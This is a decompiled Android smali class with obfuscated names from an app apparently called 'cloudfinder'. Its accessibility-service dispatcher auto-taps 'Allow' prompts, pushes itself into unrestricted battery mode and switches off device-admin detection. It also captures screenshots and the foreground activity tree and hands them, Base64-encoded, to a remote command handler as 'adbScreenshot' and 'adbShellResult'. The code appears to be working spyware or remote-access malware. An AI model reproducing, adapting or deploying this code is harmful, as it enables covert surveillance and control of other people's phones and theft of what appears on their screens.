.class public final synthetic Lةؽڗںۍټ٘/؋;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I


# direct methods
.method public synthetic constructor <init>(I)V
    .locals 0

    iput p1, p0, Lةؽڗںۍټ٘/؋;->آ:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 11

    const-string v0, ": opened app detail for battery"

    iget v1, p0, Lةؽڗںۍټ٘/؋;->آ:I

    const-string v2, "BatUnrestricted"

    const-wide/16 v3, 0x1f4

    const/4 v5, 0x1

    const/4 v6, 0x0

    packed-switch v1, :pswitch_data_0

    goto/16 :goto_9

    :pswitch_0
    sget-object v0, Lڗًقڔ/؋;->ح:Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    sget-object v0, Lڗًقڔ/؋;->ج:Landroid/os/Handler;

    new-instance v1, Lڝږ؁ڋ/ا;

    invoke-direct {v1, v6}, Lڝږ؁ڋ/ا;-><init>(I)V

    invoke-virtual {v0, v1, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :pswitch_1
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_2
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_3
    sput-boolean v5, Lڗًقڔ/؋;->ؼ:Z

    sget-object v1, Lڗًقڔ/؋;->ح:Landroid/accessibilityservice/AccessibilityService;

    const-string v3, "package:"

    sput-boolean v5, Lڗًقڔ/؋;->ؼ:Z

    :try_start_0
    new-instance v4, Landroid/content/Intent;

    const-string v5, "android.settings.APPLICATION_DETAILS_SETTINGS"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-direct {v4, v5, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v3, 0x10000000

    invoke-virtual {v4, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v4}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    sget v3, Lڗًقڔ/؋;->ؿ:I

    invoke-static {v3}, Landroidx/activity/result/؋;->ض(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    sget v3, Lڗًقڔ/؋;->ؿ:I

    invoke-static {v3}, Landroidx/activity/result/؋;->ض(I)Ljava/lang/String;

    move-result-object v3

    const-string v4, ": app detail failed"

    invoke-virtual {v3, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-static {v1}, Lڗًقڔ/؋;->ه(Landroid/content/Context;)V

    :goto_0
    sget-object v0, Lڗًقڔ/؋;->ج:Landroid/os/Handler;

    new-instance v1, Lةؽڗںۍټ٘/؋;

    const/16 v2, 0x1d

    invoke-direct {v1, v2}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    const-wide/16 v2, 0x9c4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :pswitch_4
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_5
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_6
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_7
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_8
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_9
    sget-object v0, Lڝږ؁ڋ/ة;->ب:Lڝږ؁ڋ/ة;

    invoke-static {v0}, Lڗًقڔ/؋;->ټ(Lڝږ؁ڋ/ة;)V

    const-string v0, "Page loaded, starting TAP_ALLOW"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :pswitch_a
    invoke-static {}, Lڗًقڔ/؋;->؋()V

    return-void

    :pswitch_b
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_c
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_d
    invoke-static {}, Lڗًقڔ/؋;->ض()V

    return-void

    :pswitch_e
    sget-object v0, Lڗًقڔ/؋;->ح:Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    sget-object v0, Lڗًقڔ/؋;->ج:Landroid/os/Handler;

    new-instance v1, Lةؽڗںۍټ٘/؋;

    const/16 v2, 0x1c

    invoke-direct {v1, v2}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    invoke-virtual {v0, v1, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :pswitch_f
    invoke-static {}, Lڗًقڔ/؋;->؋()V

    return-void

    :pswitch_10
    sget-boolean v0, Lڗًقڔ/؋;->ئ:Z

    if-eqz v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Total timeout, aborting. step="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lڗًقڔ/؋;->إ:Lڝږ؁ڋ/ة;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "step="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lڗًقڔ/؋;->إ:Lڝږ؁ڋ/ة;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TIMEOUT"

    invoke-static {v1, v0}, Lڗًقڔ/؋;->ٸ(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lڗًقڔ/؋;->ء()V

    :cond_0
    return-void

    :pswitch_11
    invoke-static {}, Lڜٟٱڀ/ت;->إ()V

    return-void

    :pswitch_12
    invoke-static {}, Lڝږ؁ڋ/د;->أ()V

    return-void

    :pswitch_13
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v0

    const-string v1, "dumpsys activity top"

    invoke-virtual {v0, v1}, Lڜأِجطّثٮ/ؠ;->ت(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :try_start_1
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "tree"

    if-eqz v0, :cond_1

    goto :goto_1

    :cond_1
    const-string v0, ""

    :goto_1
    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_2

    const-string v2, "adbShellResult"

    invoke-virtual {v0, v2, v1}, Lڜٟٱڀ/د;->ؤ(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_2
    return-void

    :pswitch_14
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v0

    invoke-virtual {v0}, Lڜأِجطّثٮ/ؠ;->ة()[B

    move-result-object v0

    if-eqz v0, :cond_5

    array-length v1, v0

    if-lez v1, :cond_5

    :try_start_2
    array-length v1, v0

    invoke-static {v0, v6, v1}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    if-nez v0, :cond_3

    goto :goto_4

    :cond_3
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v1

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v2

    invoke-static {v1, v2}, Ljava/lang/Math;->max(II)I

    move-result v3

    int-to-float v3, v3

    const/high16 v4, 0x44070000    # 540.0f

    div-float/2addr v4, v3

    const/high16 v3, 0x3f800000    # 1.0f

    invoke-static {v3, v4}, Ljava/lang/Math;->min(FF)F

    move-result v4

    cmpg-float v3, v4, v3

    if-gez v3, :cond_4

    int-to-float v1, v1

    mul-float/2addr v1, v4

    float-to-int v1, v1

    int-to-float v2, v2

    mul-float/2addr v2, v4

    float-to-int v2, v2

    invoke-static {v0, v1, v2, v5}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v1

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    move-object v0, v1

    goto :goto_2

    :catch_2
    move-exception v0

    goto :goto_3

    :cond_4
    :goto_2
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x32

    invoke-virtual {v0, v2, v3, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "img"

    const/4 v3, 0x2

    invoke-static {v0, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_5

    const-string v2, "adbScreenshot"

    invoke-virtual {v0, v2, v1}, Lڜٟٱڀ/د;->ؤ(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_4

    :goto_3
    const-string v1, "CommandDispatcher"

    const-string v2, "adbScreenshot compress error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_5
    :goto_4
    :pswitch_15
    return-void

    :pswitch_16
    move v0, v6

    :goto_5
    sget-object v1, Lڜأِجطّثٮ/ؤ;->؋:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v1

    const-string v2, "AdbTreeLoop"

    if-eqz v1, :cond_8

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    :try_start_3
    invoke-static {}, Lڜأِجطّثٮ/ؤ;->؋()Z

    move-result v1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    if-eqz v1, :cond_6

    move v0, v6

    goto :goto_6

    :catch_3
    move-exception v1

    const-string v9, "loop error"

    invoke-static {v2, v9, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_6
    add-int/2addr v0, v5

    :goto_6
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    sub-long/2addr v9, v7

    const/4 v1, 0x3

    if-le v0, v1, :cond_7

    const-wide/16 v7, 0xbb8

    goto :goto_7

    :cond_7
    sub-long v7, v3, v9

    const-wide/16 v9, 0xc8

    invoke-static {v9, v10, v7, v8}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v7

    :goto_7
    :try_start_4
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_5

    :catch_4
    :cond_8
    const-string v0, "ADB tree loop exited"

    invoke-static {v2, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :pswitch_17
    invoke-static {}, Lڜأِجطّثٮ/أ;->؋()V

    return-void

    :pswitch_18
    invoke-static {}, Lڜأِجطّثٮ/أ;->؋()V

    return-void

    :pswitch_19
    sget-object v0, Lڜأِجطّثٮ/أ;->؋:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v1

    if-nez v1, :cond_9

    goto :goto_8

    :cond_9
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {}, Lڜأِجطّثٮ/أ;->ؠ()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sub-long/2addr v3, v1

    sget-wide v1, Lڜأِجطّثٮ/أ;->أ:J

    sub-long/2addr v1, v3

    const-wide/16 v3, 0x0

    invoke-static {v3, v4, v1, v2}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v1

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0

    if-eqz v0, :cond_a

    sget-object v0, Lڜأِجطّثٮ/أ;->ؠ:Landroid/os/Handler;

    new-instance v3, Lةؽڗںۍټ٘/؋;

    const/4 v4, 0x4

    invoke-direct {v3, v4}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    invoke-virtual {v0, v3, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_a
    :goto_8
    return-void

    :pswitch_1a
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    invoke-static {}, Lڗًقڔ/؋;->ؿ()V

    return-void

    :pswitch_1b
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-boolean v0, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz v0, :cond_b

    sput-boolean v6, Lسۄھؤۏ۫/؋;->ز:Z

    const-string v0, "MyAccessSvc"

    const-string v1, "Auto-disabled deviceAdmin detection after 90s setup window"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_b
    return-void

    :pswitch_1c
    sget v0, Lcom/google/android/datatransport/runtime/scheduling/jobscheduling/AlarmManagerSchedulerBroadcastReceiver;->؋:I

    return-void

    :goto_9
    sget-object v0, Lڝږ؁ڋ/ة;->ا:Lڝږ؁ڋ/ة;

    invoke-static {v0}, Lڗًقڔ/؋;->ټ(Lڝږ؁ڋ/ة;)V

    sput v6, Lڗًقڔ/؋;->ة:I

    sput v6, Lڗًقڔ/؋;->ت:I

    return-void

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1c
        :pswitch_1b
        :pswitch_1a
        :pswitch_19
        :pswitch_18
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
